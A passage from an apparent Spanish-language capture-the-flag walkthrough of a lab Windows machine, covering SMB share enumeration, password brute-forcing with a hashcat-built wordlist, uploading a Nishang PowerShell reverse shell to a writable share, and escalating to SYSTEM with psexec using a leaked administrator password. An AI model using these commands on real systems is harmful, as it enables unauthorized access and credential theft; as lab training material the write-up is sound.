	dr--r--r--                0 Mon Mar 30 01:16:04 2026	..
	fr--r--r--              278 Mon Jul 28 20:22:59 2025	Ultimo_mensaje.txt
	IPC$                                              	READ ONLY	IPC remota
	Libertad                                          	NO ACCESS	El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
	Lluvia                                            	NO ACCESS	Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno
	Oro                                               	NO ACCESS	¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
	Santuario                                         	NO ACCESS	El Refugio de Ixchel
	Viento                                            	NO ACCESS	El viento sagrado ejecutará la tarea a su debido tiempo
```
Dentro veremos un archivo de texto.

Descarguémoslo:
```bash
smbmap -H 192.168.100.230 -u 'La_Catrina' -p 'catrina123' --download 'Dia de Muertos/Ultimo_mensaje.txt' --no-banner

mv 192.168.100.230-Dia\ de\ Muertos_Ultimo_mensaje.txt Ultimo_mensaje.txt
```

Leamos el archivo:
```bash
cat Ultimo_mensaje.txt
Solo puedo darte el quinto carácter de su clave: ‘U’. Los demás caracteres que faltan deberás encontrarlos por tu cuenta, aunque no debe ser tan difícil; solo son números o letras. Confía en tu ingenio y no olvides que el misterio siempre se revela a quien persevera.
```
Excelente, tenemos el quinto carácter de la contraseña del **usuario Quetzalcoatl** y nos dice que los faltantes pueden ser números o letras.

Tenemos que encontrar la contraseña.

### Creando Wordlist para Encontrar Contraseña de Usuario Quetzalcoatl y Cargando/Obteniendo Reverse Shell {#RevShell}

Después de leer todas las pistas, podemos ver que tenemos la siguiente contraseña incompleta:
```bash
J9c@U@%/
```

Para poder crear un wordlist, podemos utilizar la herramienta **hashcat**:
```bash
hashcat -a 3 --stdout -1 ?l?u?d J9c?1U?1%/ > wordlist.txt
```
Con este comando generamos un wordlist que contenga solamente combinaciones que reemplazan los caracteres `@` con `[a-zA-Z0-9]`.

Si utilizamos **netexec** junto al wordlist que creamos, podremos encontrar la contraseña correcta:
```bash
nxc smb 192.168.100.230 -u 'Quetzalcoatl' -p wordlist.txt | grep -E '\[\+\]|STATUS_PASSWORD_EXPIRED'
SMB                      192.168.100.230   445    FOLCLORE         [+] Folclore\Quetzalcoatl:**********
```
La encontramos.

Este usuario tiene permisos de lectura y escritura en el directorio **Viento**:
```bash
smbmap -H 192.168.100.230 -u 'Quetzalcoatl' -p '**********' -r Viento --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.100.230:445	Name: lavashop.thl        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Dia de Muertos                                    	NO ACCESS	Al final, todos somos polvo y hueso.
	IPC$                                              	READ ONLY	IPC remota
	Libertad                                          	NO ACCESS	El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
	Lluvia                                            	NO ACCESS	Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno
	Oro                                               	READ ONLY	¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
	Santuario                                         	NO ACCESS	El Refugio de Ixchel
	Viento                                            	READ, WRITE	El viento sagrado ejecutará la tarea a su debido tiempo
	./Viento
	dr--r--r--                0 Mon Mar 30 10:30:51 2026	.
	dr--r--r--                0 Mon Mar 30 10:30:51 2026	..
	fr--r--r--              432 Mon Jul 28 20:28:32 2025	Serpiente Emplumada.txt
[*] Closed 1 connections
```
Vemos un archivo de texto.

Descarguémoslo:
```bash
smbmap -H 192.168.100.230 -u 'Quetzalcoatl' -p 'J9c7U7%/' --download 'Viento/Serpiente Emplumada.txt' --no-banner

mv 192.168.100.230-Viento_Serpiente\ Emplumada.txt Serpiente_Emplumada.txt
```

Leámoslo:
```bash
cat Serpiente_Emplumada.txt
Has recorrido con valentía y sabiduría un sendero lleno de retos; te felicito, guerrero del destino.
Ahora, confía en mí, Quetzalcóatl, la serpiente emplumada, pues seré yo quien te otorgue el acceso necesario. 
Solo ejecutaré una vez aquel archivo PowerShell que decidas subir, para abrir el portal hacia lo que buscas. 
Que esta acción sea el puente que te lleve a la verdad escondida entre los vientos y las estrellas.
```
Prácticamente, nos está diciendo que podemos cargar una **Reverse Shell** de **PowerShell** a este directorio para que se ejecute.

Podemos utilizar la **Reverse Shell** de **PowerShell** de **Nishang**:
* <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">Repositorio de samratashok: Nishang - Invoke-PowerShellTcp.ps1</a>

Y la puedes descargar con **wget**:
```bash
wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
```

Solamente agregamos lo siguiente al final del script:
```batch
Invoke-PowerShellTcp -Reverse -IPAddress Tu_IP -Port Puerto_A_Elegir
```

Antes de cargarla, abrimos un listener usando **rlwrap** en conjunto con **netcat**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Cargamos la **Reverse Shell** conectándonos al **servicio SMB** con **smbclient**:
```batch
smbclient //192.168.100.230/Viento/ -U Quetzalcoatl
Password for [WORKGROUP\Quetzalcoatl]:
Try "help" to get a list of possible commands.
smb: \> put Invoke-PowerShellTcp.ps1
putting file Invoke-PowerShellTcp.ps1 as \Invoke-PowerShellTcp.ps1 (716.8 kB/s) (average 716.8 kB/s)
smb: \> exit
```

Observa la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.230] 49693
Windows PowerShell running as user Quetzalcoatl on FOLCLORE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Quetzalcoatl>whoami
folclore\quetzalcoatl
```

Obtengamos la flag del usuario:
```batch
PS C:\Users\Quetzalcoatl> cd Desktop
PS C:\Users\Quetzalcoatl\Desktop> dir

    Directorio: C:\Users\Quetzalcoatl\Desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----     29/07/2025  05:12 a. m.             54 User.txt                                                             

PS C:\Users\Quetzalcoatl\Desktop> type user.txt
...
```

## Post Explotación {#Post}

### Utilizando Psexec para Escalar Privilegios y Obtener una Sesión de Administrador {#psexec}

Al revisar los privilegios que tiene nuestro usuario, no encontramos uno que nos ayude a escalar privilegios.

Y antes de utilizar **winPEASx64**, si nos movemos al directorio **Downloads**, podemos encontrar un directorio que en su interior tiene este archivo de texto:
```batch
PS C:\Users\Quetzalcoatl\Downloads\Actualizacion> dir

    Directorio: C:\Users\Quetzalcoatl\Downloads\Actualizacion

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----     29/07/2025  05:14 a. m.             84 Venganza.txt

```

Si lo leemos, vemos que contiene la contraseña del **administrador**:
```batch
PS C:\Users\Quetzalcoatl\Downloads\Actualizacion> type Venganza.txt
He conseguido la clave del administrador!!!
La guardare para no olvidarla: **********
```

Corroboremos que esta contraseña sea del **administrador**:
```bash
nxc smb 192.168.100.230 -u 'Administrador' -p '**********'
SMB         192.168.100.230   445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:None)
SMB         192.168.100.230   445    FOLCLORE         [+] Folclore\Administrador:********** (Pwn3d!)
```
Funciona.

Sabiendo esto, tenemos varias opciones para poder escalar privilegios:
* Cargar una **Reverse Shell** para ejecutarla como **administrador** usando **netexec**.
* Aprovecharnos del script que ejecuta scripts del **usuario Quetzalcoatl** para que ejecute una **Reverse Shell** como **administrador**.
* Utilizar **psexec** para conectarnos a la máquina víctima como **administrador**.

Nuestra mejor opción y más rápida sería utilizar la herramienta **psexec**:
```batch
impacket-psexec Folclore/Administrador:'**********'@192.168.100.230
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.100.230.....
[*] Found writable share ADMIN$
[*] Uploading file tDFEbOIX.exe
[*] Opening SVCManager on 192.168.100.230.....
[*] Creating service MVQH on 192.168.100.230.....
[*] Starting service MVQH.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [Versi�n 10.0.19044.7058]

(c) Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32> whoami
nt authority\system
```
Estamos dentro.

Si bien el uso de **psexec** suelta muchas alarmas al conectarnos a una máquina, otra opción sería usar **wmiexec**, pero para esta máquina no funciona (o al menos a mí no me funciono).

Ya solo busquemos la última flag:
```batch
C:\Windows\system32> cd C:\Users\Administrador\Desktop

C:\Users\Administrador\Desktop> dir
 El volumen de la unidad C no tiene etiqueta.
...

 Directorio de C:\Users\Administrador\Desktop

03/08/2025  09:24 a. m.    <DIR>          .
03/08/2025  09:24 a. m.    <DIR>          ..
03/08/2025  09:24 a. m.                54 Root.txt
               1 archivos             54 bytes
               2 dirs  39,661,801,472 bytes libres

C:\Users\Administrador\Desktop> type Root.txt
...
```
Y con esto, terminamos la máquina.
